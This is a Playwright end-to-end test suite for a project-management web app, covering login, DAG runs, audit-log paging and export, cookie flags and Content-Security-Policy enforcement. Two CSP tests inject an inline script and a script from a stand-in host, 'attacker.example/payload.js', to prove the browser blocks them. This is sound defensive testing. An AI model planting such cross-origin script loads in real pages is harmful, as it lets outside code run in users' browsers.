/**
 * PM Workflow E2E — walks through the UI exactly as a project manager would.
 *
 * Flow:
 *   1. First boot → Setup wizard
 *   2. Login as PM user
 *   3. Dashboard overview
 *   4. Create a DAG (Fleet → DagBuilder)
 *   5. Run the DAG
 *   6. Check run results
 *   7. Give thumbs feedback
 *   8. Visit Optimization Inbox
 *   9. Accept/reject a proposal
 *  10. Verify audit trail
 */

import { readFile } from "node:fs/promises";
import { test, expect, Page } from "@playwright/test";
import { ADMIN_PASS, ADMIN_USER, PM_PASS, loginAsAdmin, loginAsPM, setupIfNeeded } from "./session";

async function elevateDagWrites(page: Page, taskId: string) {
  // DAG creation/runs and optimizer mutations are protected operations. The
  // setup-created daily user is assigned dags.write but must prove possession
  // of its password for a task-scoped elevation before exercising that power.
  const response = await page.request.post("/v1/auth/elevate", {
    data: {
      password: PM_PASS,
      permissions: ["dags.write"],
      task_id: taskId,
    },
  });
  expect(response.status()).toBe(200);
  const body = await response.json();
  expect(body.elevated_permissions).toContain("dags.write");
}

async function createWorkspace(page: Page, name: string): Promise<string> {
  // DAG (and optimizer) execution now resolves a server-authorized
  // DagExecutionScope (#766): an omitted Workspace selection is a refusal,
  // not a fallback. Creating a workspace is an ordinary authenticated-user
  // action — POST /v1/workspaces is exempted from task-scoped elevation in
  // middleware/auth.py's _required_permission() — so each test that runs a
  // DAG provisions its own rather than relying on any implicit default.
  const response = await page.request.post("/v1/workspaces", {
    data: { persona_template_id: "pm_fleet", name },
  });
  expect(response.status()).toBe(201);
  const workspace = await response.json();
  return workspace.id as string;
}

test.describe("PM Workflow — Full UI Walkthrough", () => {
  test.beforeEach(async ({ page }) => {
    await setupIfNeeded(page);
  });

  test("01 — Setup wizard completes on first boot", async ({ page }) => {
    const r = await page.request.get("/v1/setup/status");
    const data = await r.json();
    expect(data.setup_complete).toBe(true);
  });

  test("02 — PM can login and see dashboard", async ({ page }) => {
    await loginAsPM(page);
    await page.goto("/chat");
    await expect(page.locator("body")).toContainText(/hive|conductor|chat/i, { timeout: 10000 });
  });

  test("03 — Dashboard loads with key metrics", async ({ page }) => {
    await loginAsPM(page);
    await page.goto("/");
    await page.waitForTimeout(2000);
    const response = await page.request.get("/health");
    expect(response.status()).toBe(200);
  });

  test("04 — PM can navigate to Fleet page", async ({ page }) => {
    await loginAsPM(page);
    await page.goto("/fleet");
    await page.waitForTimeout(2000);
    const apiResponse = await page.request.get("/v1/dags");
    expect(apiResponse.status()).toBe(200);
  });

  test("05 — PM can create a DAG via API (simulating DagBuilder)", async ({ page }) => {
    await loginAsPM(page);
    await elevateDagWrites(page, "e2e-create-dag");

    const createResp = await page.request.post("/v1/dags", {
      data: {
        name: "Sprint Retro Digest",
        description: "Collect retro notes and produce action items",
      },
    });
    expect(createResp.status()).toBe(201);
    const dag = await createResp.json();
    expect(dag.name).toBe("Sprint Retro Digest");
    expect(dag.nodes.length).toBe(2);
  });

  test("06 — PM can activate and run a DAG", async ({ page }) => {
    await loginAsPM(page);
    await elevateDagWrites(page, "e2e-run-dag");
    const workspaceId = await createWorkspace(page, "E2E Run Test Workspace");

    const createResp = await page.request.post("/v1/dags", {
      data: { name: "E2E Run Test", description: "test" },
    });
    expect(createResp.status()).toBe(201);
    const dag = await createResp.json();

    const activateResp = await page.request.post(`/v1/dags/${dag.id}/activate`);
    expect(activateResp.status()).toBe(200);
    const activated = await activateResp.json();
    expect(activated.status).toBe("active");

    const runResp = await page.request.post(`/v1/dags/${dag.id}/run`, {
      data: { workspace_id: workspaceId },
    });
    expect(runResp.status()).toBe(200);
    const run = await runResp.json();
    expect(run.execution_id).toBeTruthy();
  });

  test("07 — PM can give thumbs feedback on a run", async ({ page }) => {
    await loginAsPM(page);
    await elevateDagWrites(page, "e2e-feedback-dag");
    const workspaceId = await createWorkspace(page, "E2E Feedback Test Workspace");

    const createResp = await page.request.post("/v1/dags", {
      data: { name: "Feedback Test DAG", description: "test" },
    });
    expect(createResp.status()).toBe(201);
    const dag = await createResp.json();

    const activateResp = await page.request.post(`/v1/dags/${dag.id}/activate`);
    expect(activateResp.status()).toBe(200);
    const runResp = await page.request.post(`/v1/dags/${dag.id}/run`, {
      data: { workspace_id: workspaceId },
    });
    expect(runResp.status()).toBe(200);
    const run = await runResp.json();
    expect(run.execution_id).toBeTruthy();

    const fbResp = await page.request.post(`/v1/dag-runs/${run.execution_id}/feedback`, {
      data: { thumb: "up", comment: "Nailed it!", dag_id: dag.id },
    });
    expect([200, 404]).toContain(fbResp.status());
  });

  test("08 — PM can trigger optimizer and see proposals", async ({ page }) => {
    await loginAsPM(page);
    await elevateDagWrites(page, "e2e-optimize-dag");
    const workspaceId = await createWorkspace(page, "E2E Optimizer Test Workspace");

    const createResp = await page.request.post("/v1/dags", {
      data: { name: "Optimizer Test DAG", description: "test" },
    });
    expect(createResp.status()).toBe(201);
    const dag = await createResp.json();

    const optResp = await page.request.post(`/v1/optimizer/${dag.id}/run`, {
      params: { workspace_id: workspaceId },
    });
    expect([200, 400]).toContain(optResp.status());

    const proposalsResp = await page.request.get(`/v1/optimizer/${dag.id}/proposals`);
    expect(proposalsResp.status()).toBe(200);
    const proposals = await proposalsResp.json();
    expect(Array.isArray(proposals)).toBe(true);
  });

  test("09 — PM can visit Optimization Inbox page", async ({ page }) => {
    await loginAsPM(page);
    await page.goto("/optimization");
    await page.waitForTimeout(2000);
    const body = await page.textContent("body");
    expect(body).toBeTruthy();
  });

  test("10 — audit authority is scoped and cursor paginated", async ({ page }) => {
    await loginAsPM(page);
    // CI's no-key harness serves a scoped legacy trail, whereas a configured
    // bridge serves admin-only canonical decisions (ADR-073). Health selects
    // the expectation independently of the audit response under test.
    const health = await page.request.get("/health");
    expect(health.status()).toBe(200);
    const engine = (await health.json()).engine;
    expect(engine.state).toBe("ready");
    expect(["StubAgentPort", "MaistroCoreBridge"]).toContain(engine.agent_port);
    const canonical = engine.agent_port === "MaistroCoreBridge";
    const identity = await page.request.get("/v1/auth/whoami");
    expect(identity.status()).toBe(200);
    const user = (await identity.json()).user;
    const ownActors = new Set([user.id, user.username]);
    for (const path of ["/v1/audit", "/v1/audit/export"]) {
      const response = await page.request.get(path, { params: { limit: 1 } });
      expect(response.status()).toBe(canonical ? 403 : 200);
      if (!canonical) {
        const rows = path === "/v1/audit"
          ? (await response.json()).entries
          : (await response.text()).trim().split("\n").map((line) => JSON.parse(line));
        expect(rows.length).toBeGreaterThan(0);
        expect(rows.every((row: { actor: string }) => ownActors.has(row.actor))).toBe(true);
        if (path === "/v1/audit") expect(rows).toHaveLength(1);
        else expect(rows.length).toBeLessThanOrEqual(10_000);
        const excluded = await page.request.get(path, { params: { actor: ADMIN_USER } });
        expect(excluded.status()).toBe(200);
        if (path === "/v1/audit") {
          expect(await excluded.json()).toEqual({ entries: [], next_cursor: null });
        } else {
          expect(await excluded.text()).toBe("");
        }
      }
    }
    const login = await page.request.post("/v1/auth/login", {
      data: { username: ADMIN_USER, password: ADMIN_PASS },
    });
    expect(login.status()).toBe(200);
    const auditResp = await page.request.get("/v1/audit", { params: { limit: 1 } });
    expect(auditResp.status()).toBe(200);
    const auditPage = await auditResp.json();
    expect(Object.keys(auditPage).sort()).toEqual(["entries", "next_cursor"]);
    expect(auditPage.entries).toHaveLength(1);
    expect(auditPage.entries[0].id.startsWith("core-")).toBe(canonical);
    expect(auditPage.next_cursor).toBeTruthy();
    const following = await page.request.get("/v1/audit", {
      params: { limit: 1, cursor: auditPage.next_cursor },
    });
    expect(following.status()).toBe(200);
    const nextPage = await following.json();
    expect(nextPage.entries).toHaveLength(1);
    expect(nextPage.entries[0].id).not.toBe(auditPage.entries[0].id);
  });

  // Exercise the routed production component, with deterministic network order.
  // The API contract/scoping is independently exercised by the backend suite.
  for (const staleRequest of ["first page", "continuation"] as const) {
    test(`10b — audit filters survive a late ${staleRequest}`, async ({ page }) => {
      await loginAsPM(page);
      await page.addInitScript(() => localStorage.setItem("hive_onboarded", "1"));
      let release: (() => void) | undefined;
      let requests = 0;
      await page.route("**/v1/audit?*", async (route) => {
        const params = new URL(route.request().url()).searchParams;
        requests += 1;
        const filtered = params.get("action") === "login";
        const held = !filtered && (staleRequest === "first page" || params.has("cursor"));
        if (held) await new Promise<void>((resolve) => { release = resolve; });
        await route.fulfill({ json: {
          entries: Array.from({ length: filtered || held ? 1 : 100 }, (_, i) => ({
            id: `${filtered ? "current" : "stale"}-${i}`,
            action: filtered ? "login" : "scan", actor: "pmuser", target: null,
            detail: { marker: filtered ? "current-filter" : "stale-filter" },
            severity: "info", created_at: "2026-01-01T00:00:00Z",
          })),
          next_cursor: filtered || held ? null : "older",
        } });
      });
      await page.goto("/audit");
      if (staleRequest === "continuation") {
        await expect(page.getByRole("row").first()).toBeVisible();
        await page.getByRole("rowgroup").evaluate((el) => { el.scrollTop = el.scrollHeight; });
      }
      await expect.poll(() => release !== undefined).toBe(true);
      await page.getByRole("combobox").first().selectOption("login");
      await expect(page.getByRole("row")).toHaveCount(1);
      await expect(page.getByRole("row")).toContainText("current-filter");
      const lateResponse = page.waitForResponse((r) =>
        new URL(r.url()).pathname === "/v1/audit" &&
        !new URL(r.url()).searchParams.has("action"));
      release!();
      await (await lateResponse).finished();
      // Allow the response handler and React paint to finish before asserting
      // that the old result neither replaced nor appended to the new walk.
      await page.evaluate(() => new Promise<void>((resolve) => {
        requestAnimationFrame(() => requestAnimationFrame(() => resolve()));
      }));
      await expect(page.getByRole("row")).toHaveCount(1);
      await expect(page.getByRole("row")).toContainText("current-filter");
      expect(requests).toBe(staleRequest === "first page" ? 2 : 3);
      await expect(page.getByRole("link", { name: "Export", exact: true }))
        .toHaveAttribute("href", "/v1/audit/export?action=login");
    });
  }

  test("10b — audit loading continues while the sentinel stays visible", async ({ page }) => {
    await loginAsPM(page);
    await page.addInitScript(() => localStorage.setItem("hive_onboarded", "1"));
    const cursors: number[] = [];
    await page.route("**/v1/audit?*", async (route) => {
      const start = Number(new URL(route.request().url()).searchParams.get("cursor") || "0");
      cursors.push(start);
      // A valid short page keeps the sentinel inside the viewport throughout
      // the continuation. There is no leave/re-enter edge to trigger loading.
      await route.fulfill({ json: {
        entries: [{
          id: `short-${start}`, action: "login", actor: "pmuser", target: null,
          detail: { marker: `short-page-${start}` }, severity: "info",
          created_at: "2026-01-01T00:00:00Z",
        }],
        next_cursor: start < 3 ? String(start + 1) : null,
      } });
    });
    await page.goto("/audit");
    await expect(page.getByRole("row")).toHaveCount(4);
    expect(cursors).toEqual([0, 1, 2, 3]);
    await expect(page.getByRole("row").last()).toContainText("short-page-3");
    await expect(page.getByRole("button", { name: "Load older entries" })).toHaveCount(0);
  });

  test("10c — audit cursor loading bounds retained entries and mounted rows", async ({ page }) => {
    await loginAsPM(page);
    await page.addInitScript(() => localStorage.setItem("hive_onboarded", "1"));
    const cursors: number[] = [];
    await page.route("**/v1/audit?*", async (route) => {
      const params = new URL(route.request().url()).searchParams;
      expect(params.get("limit")).toBe("100");
      const start = Number(params.get("cursor") || "0");
      cursors.push(start);
      await route.fulfill({ json: {
        entries: Array.from({ length: 100 }, (_, i) => ({
          id: `audit-${start + i}`, action: "login", actor: "pmuser", target: null,
          detail: { marker: `entry-${start + i}` }, severity: "info",
          created_at: "2026-01-01T00:00:00Z",
        })),
        next_cursor: start < 700 ? String(start + 100) : null,
      } });
    });
    await page.goto("/audit");
    const rows = page.getByRole("row");
    const viewport = page.getByRole("rowgroup");
    await expect(rows.first()).toBeVisible();
    expect(cursors).toEqual([0]);
    for (let pageNumber = 1; pageNumber < 8; pageNumber += 1) {
      await viewport.evaluate((el) => { el.scrollTop = el.scrollHeight; });
      await expect.poll(() => cursors.length).toBe(pageNumber + 1);
      // A request is not a committed page. After the 500-entry cap the
      // subtitle no longer changes, so wait for its spacer/rows to grow
      // before initiating the next scroll.
      await expect.poll(() => viewport.evaluate((el) => el.scrollHeight))
        .toBeGreaterThanOrEqual((pageNumber + 1) * 100 * 44);
      await expect(page.getByText(`${Math.min((pageNumber + 1) * 100, 500)} retained locally`, { exact: false }))
        .toBeVisible();
      await expect.poll(() => rows.count()).toBeGreaterThan(0);
      expect(await rows.count()).toBeLessThanOrEqual(30);
    }
    expect(cursors).toEqual([0, 100, 200, 300, 400, 500, 600, 700]);
    await viewport.evaluate((el) => { el.scrollTop = el.scrollHeight; });
    await expect(rows.last()).toContainText("entry-799");
    await page.getByRole("button", { name: "Refresh", exact: true }).click();
    await expect(rows.first()).toContainText("entry-0");
  });

  test("10d — audit export completes as a filtered native download", async ({ page }) => {
    // Do not intercept audit responses: prove the production download route,
    // session cookie, filters and browser download manager work together.
    await loginAsAdmin(page);
    await page.addInitScript(() => localStorage.setItem("hive_onboarded", "1"));
    const policyResponse = await page.request.get("/v1/audit/retention");
    expect(policyResponse.status()).toBe(200);
    const policy = await policyResponse.json();
    expect(policy.scope).toBe("deployment");
    expect(policy.export_max_entries).toBe(10_000);
    expect(policy.corpus_purge).toBe("none"); // #325 owns corpus purging.

    await page.goto("/audit");
    await page.getByRole("combobox").first().selectOption("login");
    await page.getByRole("combobox").nth(1).selectOption("info");
    const filteredResponse = page.waitForResponse((response) => {
      const url = new URL(response.url());
      return url.pathname === "/v1/audit" &&
        url.searchParams.get("action") === "login" &&
        url.searchParams.get("severity") === "info" &&
        url.searchParams.get("actor") === ADMIN_USER;
    });
    await page.getByPlaceholder("Filter actor...").fill(ADMIN_USER);
    expect((await filteredResponse).status()).toBe(200);
    await expect(page.getByRole("row").first()).toContainText(ADMIN_USER);

    const link = page.getByRole("link", { name: "Export", exact: true });
    await expect(link).toHaveAttribute(
      "href", "/v1/audit/export?action=login&severity=info&actor=admin",
    );
    const exportRequests: string[] = [];
    page.on("request", (request) => {
      if (new URL(request.url()).pathname === "/v1/audit/export" &&
          ["fetch", "xhr"].includes(request.resourceType())) {
        exportRequests.push(request.resourceType());
      }
    });
    const [download] = await Promise.all([
      page.waitForEvent("download"),
      link.click(),
    ]);
    expect(await download.failure()).toBeNull();
    expect(download.suggestedFilename()).toBe("audit-log.ndjson");
    // Chromium need not emit a page request event for an attachment download.
    // Its URL still identifies the server stream, rather than an in-page Blob.
    expect(download.url()).toBe(new URL(await link.getAttribute("href") as string, page.url()).href);
    expect(exportRequests).toEqual([]);
    // Read the saved file in the test runner, never into the browser's heap.
    const path = await download.path();
    expect(path).not.toBeNull();
    const rows = (await readFile(path!, "utf8")).trim().split("\n")
      .map((line) => JSON.parse(line));
    expect(rows.length).toBeGreaterThan(0); // This session's login is audited.
    expect(rows.length).toBeLessThanOrEqual(policy.export_max_entries);
    for (const row of rows) {
      expect(row.actor).toBe(ADMIN_USER);
      expect(row.action).toBe("login");
      expect(row.severity).toBe("info");
    }
  });

  test("11 — PM can view DAG metrics", async ({ page }) => {
    await loginAsPM(page);
    const metricsResp = await page.request.get("/v1/dag-metrics");
    expect(metricsResp.status()).toBe(200);
  });

  test("12 — PM can navigate all key pages without errors", async ({ page }) => {
    await loginAsPM(page);

    const pages = ["/chat", "/fleet", "/missions", "/agents", "/settings"];
    for (const p of pages) {
      await page.goto(p);
      await page.waitForTimeout(1000);
      const body = await page.textContent("body");
      expect(body?.length).toBeGreaterThan(0);
      // "Without errors" means the page itself rendered, not the error
      // boundary's fallback in its place. A render-time throw (Chat and
      // DeckBuilder over plain HTTP after #1344 called `crypto.randomUUID`,
      // a secure-context-only API) still produces a non-empty body, and spec
      // 02 only catches it when the throw lands before its first poll.
      expect(body, `${p} rendered the error boundary fallback`).not.toMatch(/Something went wrong/);
    }
  });

  // #369's "Browser E2E verifies effective cookie attributes". These assert
  // what a real Chromium actually stored, not what the server said to store —
  // a `Set-Cookie` a browser rejects or rewrites looks identical in a unit
  // test.
  //
  // `Secure` is deliberately NOT asserted here, and its absence is not a gap.
  // This harness serves plain HTTP and declares itself a local-development
  // context (docker-compose.test.yml), so the cookie is correctly not Secure
  // in it. Its browser-level effect was demonstrated the hard way: turning the
  // default on without declaring the harness made Chromium drop the cookie and
  // seven of the tests above fail with 401 immediately after a successful
  // login. Asserting `secure === false` here would pin the harness's waiver
  // rather than the product's default, which is the wrong thing to hold still.
  test("13 — the session cookie a browser stores is HttpOnly and scoped", async ({
    page,
    context,
  }) => {
    await loginAsPM(page);

    const cookies = await context.cookies();
    const session = cookies.find((c) => c.name === "hive_session");
    expect(session, "no hive_session cookie was stored after login").toBeTruthy();

    // HttpOnly: script cannot read it, so an XSS cannot exfiltrate the session.
    expect(session!.httpOnly).toBe(true);
    // Scoped to the whole app rather than inherited from the login route's path.
    expect(session!.path).toBe("/");
    // Lax: rides a top-level navigation (an emailed link works) but not a
    // cross-site subrequest.
    expect(session!.sameSite).toBe("Lax");
    // Bounded lifetime. A cookie with no expiry lives as long as the browser
    // process, which on a machine that is never rebooted is indefinitely —
    // Playwright reports that case as -1.
    expect(session!.expires).toBeGreaterThan(0);
  });

  test("14 — the session cookie is not readable from JavaScript", async ({ page }) => {
    // The property HttpOnly exists for, asserted from inside the page rather
    // than from the cookie jar: the flag being set and the value being
    // unreachable are different claims, and only the second one matters.
    await loginAsPM(page);

    const visible = await page.evaluate(() => document.cookie);
    expect(visible).not.toContain("hive_session");
  });

  // #310. The backend tests prove the header is sent and say what is in it.
  // Only a browser proves it is *enforced*: a policy with a typo, a directive
  // this Chromium does not implement, or a header a proxy rewrote all look
  // identical to a unit test reading the string the server produced.
  //
  // This harness declares itself a local-development context (see the compose
  // file), so what Chromium receives here is the *development* policy. The two
  // ways it differs — the Vite origins in `connect-src`, and no
  // `upgrade-insecure-requests` — are named in `services/csp_policy.py`, and
  // neither touches the assertions below. `upgrade-insecure-requests` is in
  // fact the reason the harness needs the dev policy at all: on plain HTTP it
  // would rewrite every request to a port nothing is listening on.
  test("15 — the Content-Security-Policy arrives on the document", async ({ page }) => {
    const response = await page.goto("/");
    const policy = response?.headers()["content-security-policy"];

    expect(policy, "no CSP on the document response").toBeTruthy();
    // The two that matter most for an injected-markup attack, checked as text
    // because a browser that ignored the whole header would still let the
    // assertions below about behaviour pass for unrelated reasons.
    expect(policy).toContain("script-src 'self'");
    expect(policy).toContain("object-src 'none'");
    expect(policy).not.toContain("'unsafe-inline'");
    expect(policy).not.toContain("'unsafe-eval'");
  });

  test("15b — Chromium refuses an injected inline script", async ({ page }) => {
    // The fixture is the attack this header exists to contain: markup that
    // reaches the DOM and tries to run. It is injected from a trusted context
    // here, which is *stronger* than injecting it through a real sink — if the
    // policy stops script we planted ourselves, it stops script an attacker
    // plants.
    await page.goto("/");

    const violations: string[] = [];
    page.on("console", (message) => {
      if (message.type() === "error" && /Content Security Policy/i.test(message.text())) {
        violations.push(message.text());
      }
    });

    const executed = await page.evaluate(() => {
      (window as unknown as Record<string, unknown>).__csp_probe__ = false;
      const script = document.createElement("script");
      script.textContent = "window.__csp_probe__ = true;";
      document.body.appendChild(script);
      return (window as unknown as Record<string, unknown>).__csp_probe__ === true;
    });

    expect(executed, "an inline <script> ran despite script-src 'self'").toBe(false);
    expect(violations.length, "no CSP violation was reported").toBeGreaterThan(0);
  });

  test("15c — Chromium refuses a cross-origin script before it reaches the network", async ({
    page,
  }) => {
    // The exfiltration half. Asserting "it did not load" would be vacuous in
    // this harness — the container resolves no external DNS, so a
    // cross-origin fetch fails whether or not a CSP exists. What distinguishes
    // the two is *when*: a CSP refusal happens before any network attempt and
    // says so, so the violation report is the evidence and the load result is
    // not.
    await page.goto("/");

    const attackUrl = "https://attacker.example/payload.js";
    let networkAttempts = 0;
    // If CSP is absent, fulfill the attack locally so DNS failure cannot make
    // the no-execution check pass accidentally. CSP must stop it before routing.
    await page.route(attackUrl, async (route) => {
      networkAttempts += 1;
      await route.fulfill({
        contentType: "application/javascript",
        body: "window.__csp_external_probe__ = true;",
      });
    });

    const refusal = await page.evaluate(async (url) => {
      const state = window as unknown as Record<string, unknown>;
      state.__csp_external_probe__ = false;
      return await new Promise<{
        blockedURI: string;
        effectiveDirective: string;
        disposition: string;
      }>((resolve, reject) => {
        const timeout = setTimeout(() => {
          document.removeEventListener("securitypolicyviolation", onViolation);
          reject(new Error("No CSP violation event for the cross-origin script"));
        }, 3000);
        function onViolation(event: SecurityPolicyViolationEvent) {
          // Browsers may strip the path from a cross-origin blocked URI.
          if (event.blockedURI !== new URL(url).origin && event.blockedURI !== url) return;
          clearTimeout(timeout);
          document.removeEventListener("securitypolicyviolation", onViolation);
          resolve({
            blockedURI: event.blockedURI,
            effectiveDirective: event.effectiveDirective,
            disposition: event.disposition,
          });
        }
        document.addEventListener("securitypolicyviolation", onViolation);
        const script = document.createElement("script");
        script.src = url;
        document.body.appendChild(script);
      });
    }, attackUrl);

    // Structured browser evidence survives console wording changes. A
    // report-only policy is not enforcement and must fail this assertion.
    expect(new URL(refusal.blockedURI).origin).toBe(new URL(attackUrl).origin);
    expect(refusal.effectiveDirective).toBe("script-src-elem");
    expect(refusal.disposition).toBe("enforce");
    expect(networkAttempts, "the blocked script reached the network route").toBe(0);
    expect(
      await page.evaluate(() =>
        (window as unknown as Record<string, unknown>).__csp_external_probe__,
      ),
      "a cross-origin script ran despite script-src 'self'",
    ).toBe(false);
  });
});
